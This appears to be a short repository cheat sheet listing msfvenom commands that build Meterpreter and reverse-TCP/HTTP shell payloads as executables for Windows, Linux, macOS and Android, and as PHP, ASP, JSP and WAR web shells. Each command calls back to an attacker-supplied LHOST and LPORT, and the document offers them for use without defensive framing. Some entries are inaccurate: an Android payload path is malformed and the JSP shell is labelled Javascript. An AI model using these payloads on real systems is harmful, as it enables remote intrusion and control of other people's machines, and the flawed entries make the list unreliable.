# Msfvenom-Cheat-Sheet
A list of msfvenom commands

## Binaries
| Command       | Info           |
| ------------- |:-------------:|
|msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > example.exe | Creates a simple TCP Payload for Windows |
|msfvenom -p windows/meterpreter/reverse_http LHOST=(IP Address) LPORT=(Your Port) -f exe > example.exe | Creates a simple HTTP Payload for Windows |
|msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > example.elf | Creates a simple TCP Shell for Linux |
|msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > example.macho | Creates a simple TCP Shell for Mac |
|msfvenom -p android/meterpreter/reverse/tcp LHOST=(IP Address) LPORT=(Your Port) R > example.apk | Creats a simple TCP Payload for Android |

## Web Payloads
| Command       | Info           |
| ------------- |:-------------:|
|msfvenom -p php/meterpreter_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw > example.php | Creats a Simple TCP Shell for PHP |
|msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp > example.asp | Creats a Simple TCP Shell for ASP |
|msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw > example.jsp | Creats a Simple TCP Shell for Javascript |
|msfvenom -p java/jsp_shell_reverse_tcp LHOST=(Your IP) LPORT=(Your Port) -f war > example.war | Creats a Simple TCP Shell for WAR |
